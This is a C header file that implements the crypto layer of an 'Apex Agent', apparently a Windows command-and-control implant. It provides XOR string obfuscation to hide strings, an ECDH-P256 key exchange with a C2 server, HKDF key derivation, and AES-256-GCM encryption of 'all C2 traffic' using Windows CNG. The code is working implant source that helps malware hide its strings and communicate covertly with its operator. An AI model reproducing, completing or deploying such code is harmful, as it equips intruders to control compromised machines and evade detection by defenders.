#ifndef APEX_CRYPTO_H
#define APEX_CRYPTO_H

/*
 * Apex Agent Crypto Layer
 *   - XOR string encryption/decryption (compile-time obfuscation)
 *   - ECDH-P256 ephemeral key exchange  (universally available via CNG)
 *   - HKDF-SHA-256 session-key derivation
 *   - AES-256-GCM authenticated encryption for all C2 traffic
 *
 * Uses Windows CNG (bcrypt.h) throughout — no external libraries.
 * Wire format:  base64( nonce[12] || ciphertext || gcm_tag[16] )
 *
 * Key-exchange note:
 *   Agent generates an ephemeral ECDH-P256 key pair.
 *   It sends its 65-byte uncompressed public key (04 || X[32] || Y[32])
 *   base64-encoded to the server.  The server (Go side) also generates a
 *   P256 keypair and returns its 65-byte public key + 32-byte HKDF salt
 *   (kex_nonce).  Both sides derive the 32-byte session key via
 *   HKDF-SHA-256(ecdh_shared_secret_x, kex_nonce, "apex-c2-v1").
 */

#include <windows.h>
#include <string.h>

/* ── XOR String Encryption ────────────────────────────────── */

#ifndef XOR_KEY
#define XOR_KEY 0x41
#endif

static void xor_decrypt(char *buf, size_t len) {
    for (size_t i = 0; i < len; i++)
        buf[i] ^= XOR_KEY;
}

#define ENCRYPTED_STRING(varname, plaintext) \
    static char varname##_data[] = plaintext; \
    static int varname##_init = 0; \
    static char *varname##_get(void) { \
        if (!varname##_init) { \
            for (size_t i = 0; i < sizeof(varname##_data)-1; i++) \
                varname##_data[i] ^= XOR_KEY; \
            varname##_init = 1; \
        } \
        return varname##_data; \
    }

/* ── Windows CNG base ─────────────────────────────────────── */

#include <bcrypt.h>

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

/* ── Random bytes via CNG ────────────────────────────────── */

static int crypto_random(UCHAR *buf, ULONG len) {
    BCRYPT_ALG_HANDLE hRng;
    if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&hRng, BCRYPT_RNG_ALGORITHM, NULL, 0)))
        return -1;
    NTSTATUS st = BCryptGenRandom(hRng, buf, len, 0);
    BCryptCloseAlgorithmProvider(hRng, 0);
    return NT_SUCCESS(st) ? 0 : -1;
}

/* ── ECDH-P256 key exchange ───────────────────────────────── */

/*
 * P-256 public key wire format (65 bytes, uncompressed):
 *    0x04 || X[32] || Y[32]
 * This is what we base64-encode and send to / receive from the server.
 */
#define ECDH_PUB_LEN 65   /* uncompressed P-256 point */

typedef struct { BCRYPT_ALG_HANDLE hAlg; BCRYPT_KEY_HANDLE hKey; } ecdh_keypair;

/*
 * ecdh_gen_keypair:
 *   Generate an ephemeral ECDH-P256 key pair.
 *   kp           - output CNG handle pair (caller must call ecdh_free)
 *   out_pub65    - output 65-byte uncompressed public key
 *   Returns 0 on success, -1 on failure.
 */
static int ecdh_gen_keypair(ecdh_keypair *kp, UCHAR *out_pub65) {
    memset(kp, 0, sizeof(*kp));

    NTSTATUS st = BCryptOpenAlgorithmProvider(&kp->hAlg, BCRYPT_ECDH_P256_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(st)) return -1;

    st = BCryptGenerateKeyPair(kp->hAlg, &kp->hKey, 256, 0);
    if (!NT_SUCCESS(st)) { BCryptCloseAlgorithmProvider(kp->hAlg, 0); kp->hAlg = NULL; return -1; }

    st = BCryptFinalizeKeyPair(kp->hKey, 0);
    if (!NT_SUCCESS(st)) goto ecdh_gen_fail;

    /*
     * Export: BCRYPT_ECCPUBLIC_BLOB = { BCRYPT_ECCKEY_BLOB header, X[32], Y[32] }
     * Convert to uncompressed point: 0x04 || X || Y
     */
    UCHAR blob[1024]; ULONG blob_len = 0;
    st = BCryptExportKey(kp->hKey, NULL, BCRYPT_ECCPUBLIC_BLOB, blob, sizeof(blob), &blob_len, 0);
    if (!NT_SUCCESS(st)) goto ecdh_gen_fail;

    {
        BCRYPT_ECCKEY_BLOB *hdr = (BCRYPT_ECCKEY_BLOB *)blob;
        ULONG key_bytes = hdr->cbKey; /* 32 for P-256 */
        if (key_bytes != 32) goto ecdh_gen_fail;
        const UCHAR *X = blob + sizeof(BCRYPT_ECCKEY_BLOB);
        const UCHAR *Y = X + key_bytes;
        out_pub65[0] = 0x04;
        memcpy(out_pub65 + 1,       X, 32);
        memcpy(out_pub65 + 1 + 32,  Y, 32);
    }
    return 0;

ecdh_gen_fail:
    if (kp->hKey)  { BCryptDestroyKey(kp->hKey); kp->hKey = NULL; }
    if (kp->hAlg)  { BCryptCloseAlgorithmProvider(kp->hAlg, 0); kp->hAlg = NULL; }
    return -1;
}

static void ecdh_free(ecdh_keypair *kp) {
    if (kp->hKey)  BCryptDestroyKey(kp->hKey);
    if (kp->hAlg)  BCryptCloseAlgorithmProvider(kp->hAlg, 0);
    memset(kp, 0, sizeof(*kp));
}

/*
 * ecdh_compute_shared:
 *   Compute the raw 32-byte ECDH shared secret (X-coordinate of the
 *   Diffie-Hellman result) from our private key handle and the peer's
 *   65-byte uncompressed public key (04 || X || Y).
 *
 *   Returns 0 on success, -1 on error.
 */
static int ecdh_compute_shared(ecdh_keypair *kp, const UCHAR *peer_pub65, UCHAR *shared32) {
    if (peer_pub65[0] != 0x04) return -1; /* must be uncompressed */

    /*
     * Build a BCRYPT_ECCPUBLIC_BLOB from the uncompressed point.
     * Layout: BCRYPT_ECCKEY_BLOB header { Magic, cbKey } + X[32] + Y[32]
     */
    UCHAR import_blob[sizeof(BCRYPT_ECCKEY_BLOB) + 64];
    BCRYPT_ECCKEY_BLOB *hdr = (BCRYPT_ECCKEY_BLOB *)import_blob;
    hdr->dwMagic = BCRYPT_ECDH_PUBLIC_P256_MAGIC;
    hdr->cbKey   = 32;
    memcpy(import_blob + sizeof(BCRYPT_ECCKEY_BLOB),       peer_pub65 + 1,      32); /* X */
    memcpy(import_blob + sizeof(BCRYPT_ECCKEY_BLOB) + 32,  peer_pub65 + 1 + 32, 32); /* Y */

    BCRYPT_KEY_HANDLE hPeerKey = NULL;
    NTSTATUS st = BCryptImportKeyPair(kp->hAlg, NULL, BCRYPT_ECCPUBLIC_BLOB,
                                      &hPeerKey,
                                      import_blob, (ULONG)sizeof(import_blob), 0);
    if (!NT_SUCCESS(st)) return -1;

    BCRYPT_SECRET_HANDLE hSecret = NULL;
    st = BCryptSecretAgreement(kp->hKey, hPeerKey, &hSecret, 0);
    BCryptDestroyKey(hPeerKey);
    if (!NT_SUCCESS(st)) return -1;

    /*
     * Derive the raw DH shared secret using BCRYPT_KDF_HASH with SHA-256.
     * This hashes the X-coordinate, giving us 32 bytes directly.
     * We then apply our own HKDF on top for domain separation.
     */
    BCryptBuffer kdfParam = { sizeof(BCRYPT_SHA256_ALGORITHM),
                              KDF_HASH_ALGORITHM,
                              (PVOID)BCRYPT_SHA256_ALGORITHM };
    BCryptBufferDesc kdfParams = { BCRYPTBUFFER_VERSION, 1, &kdfParam };
    ULONG cbDerived = 0;
    st = BCryptDeriveKey(hSecret, BCRYPT_KDF_HASH, &kdfParams,
                         shared32, 32, &cbDerived, 0);
    BCryptDestroySecret(hSecret);
    return NT_SUCCESS(st) ? 0 : -1;
}

/* ── HKDF-SHA-256 ─────────────────────────────────────────── */

/*
 * hkdf_sha256:
 *   Derives out_len bytes (≤ 32) of key material using HKDF (RFC 5869).
 *   ikm/ikm_len  - input key material (hashed DH shared secret)
 *   salt/salt_len- HKDF salt (kex_nonce from server, 32 bytes)
 *   info         - context label string (NUL-terminated ASCII)
 *   out/out_len  - output buffer (max 32 bytes)
 *   Returns 0 on success, -1 on error.
 */
static int hkdf_sha256(const UCHAR *ikm, ULONG ikm_len,
                        const UCHAR *salt, ULONG salt_len,
                        const char  *info,
                        UCHAR *out, ULONG out_len) {
    if (out_len > 32) return -1;

    BCRYPT_ALG_HANDLE hHmac = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    NTSTATUS st;

    st = BCryptOpenAlgorithmProvider(&hHmac, BCRYPT_SHA256_ALGORITHM, NULL,
                                     BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (!NT_SUCCESS(st)) return -1;

    ULONG obj_sz = 0, cb = 0;
    BCryptGetProperty(hHmac, BCRYPT_OBJECT_LENGTH, (PUCHAR)&obj_sz, sizeof(ULONG), &cb, 0);
    UCHAR *obj = (UCHAR *)HeapAlloc(GetProcessHeap(), 0, obj_sz);
    if (!obj) { BCryptCloseAlgorithmProvider(hHmac, 0); return -1; }

    /* Extract: PRK = HMAC-SHA256(salt, ikm) */
    UCHAR prk[32];
    st = BCryptCreateHash(hHmac, &hHash, obj, obj_sz, (PUCHAR)salt, salt_len, 0);
    if (!NT_SUCCESS(st)) goto hkdf_fail;
    BCryptHashData(hHash, (PUCHAR)ikm, ikm_len, 0);
    BCryptFinishHash(hHash, prk, 32, 0);
    BCryptDestroyHash(hHash); hHash = NULL;

    /* Expand: T(1) = HMAC-SHA256(PRK, info || 0x01) */
    st = BCryptCreateHash(hHmac, &hHash, obj, obj_sz, prk, 32, 0);
    if (!NT_SUCCESS(st)) goto hkdf_fail;
    if (info && *info)
        BCryptHashData(hHash, (PUCHAR)info, (ULONG)strlen(info), 0);
    UCHAR ctr = 0x01;
    BCryptHashData(hHash, &ctr, 1, 0);
    UCHAR t1[32];
    BCryptFinishHash(hHash, t1, 32, 0);
    BCryptDestroyHash(hHash); hHash = NULL;

    memcpy(out, t1, out_len);
    SecureZeroMemory(prk, 32);
    SecureZeroMemory(t1, 32);
    HeapFree(GetProcessHeap(), 0, obj);
    BCryptCloseAlgorithmProvider(hHmac, 0);
    return 0;

hkdf_fail:
    if (hHash) BCryptDestroyHash(hHash);
    HeapFree(GetProcessHeap(), 0, obj);
    BCryptCloseAlgorithmProvider(hHmac, 0);
    return -1;
}

/* ── AES-256-GCM ─────────────────────────────────────────── */

/*
 * Wire format (after base64 decode):
 *   nonce[12] || gcm_ciphertext[plainlen] || auth_tag[16]
 *
 * gcm_encrypt: writes nonce + ciphertext + tag into out_buf (in-place).
 *   out_buf must be at least (plain_len + 28) bytes.
 *   Returns total bytes written, or -1 on error.
 *
 * gcm_decrypt: reads and verifies nonce + ciphertext + tag from in_buf.
 *   Returns plaintext length, or -1 on error / authentication failure.
 */

#define GCM_NONCE_LEN 12
#define GCM_TAG_LEN   16
#define GCM_OVERHEAD  (GCM_NONCE_LEN + GCM_TAG_LEN)  /* 28 */

static int gcm_encrypt(const UCHAR *key32,
                        const UCHAR *plain, ULONG plain_len,
                        UCHAR *out_buf, ULONG out_buf_size) {
    if (out_buf_size < plain_len + GCM_OVERHEAD) return -1;

    if (crypto_random(out_buf, GCM_NONCE_LEN) != 0) return -1;
    UCHAR *nonce  = out_buf;
    UCHAR *cipher = out_buf + GCM_NONCE_LEN;
    UCHAR *tag    = out_buf + GCM_NONCE_LEN + plain_len;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS st;

    st = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(st)) return -1;

    st = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                           (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                           sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!NT_SUCCESS(st)) goto gcm_enc_fail;

    st = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key32, 32, 0);
    if (!NT_SUCCESS(st)) goto gcm_enc_fail;

    memcpy(cipher, plain, plain_len);

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = GCM_NONCE_LEN;
    authInfo.pbTag   = tag;
    authInfo.cbTag   = GCM_TAG_LEN;

    ULONG cbResult = 0;
    st = BCryptEncrypt(hKey, cipher, plain_len, &authInfo,
                       NULL, 0, cipher, plain_len, &cbResult, 0);
    if (!NT_SUCCESS(st)) goto gcm_enc_fail;

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return (int)(GCM_NONCE_LEN + plain_len + GCM_TAG_LEN);

gcm_enc_fail:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return -1;
}

static int gcm_decrypt(const UCHAR *key32,
                        const UCHAR *in_buf, ULONG in_len,
                        UCHAR *out_buf, ULONG out_buf_size) {
    if (in_len < (ULONG)GCM_OVERHEAD) return -1;
    ULONG plain_len = in_len - GCM_OVERHEAD;
    if (out_buf_size < plain_len) return -1;

    const UCHAR *nonce  = in_buf;
    const UCHAR *cipher = in_buf + GCM_NONCE_LEN;
    UCHAR tag[GCM_TAG_LEN];
    memcpy(tag, in_buf + GCM_NONCE_LEN + plain_len, GCM_TAG_LEN);

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS st;

    st = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(st)) return -1;

    st = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                           (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                           sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!NT_SUCCESS(st)) goto gcm_dec_fail;

    st = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key32, 32, 0);
    if (!NT_SUCCESS(st)) goto gcm_dec_fail;

    memcpy(out_buf, cipher, plain_len);

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)nonce;
    authInfo.cbNonce = GCM_NONCE_LEN;
    authInfo.pbTag   = tag;
    authInfo.cbTag   = GCM_TAG_LEN;

    ULONG cbResult = 0;
    st = BCryptDecrypt(hKey, out_buf, plain_len, &authInfo,
                       NULL, 0, out_buf, plain_len, &cbResult, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return NT_SUCCESS(st) ? (int)cbResult : -1;

gcm_dec_fail:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return -1;
}

#endif /* APEX_CRYPTO_H */
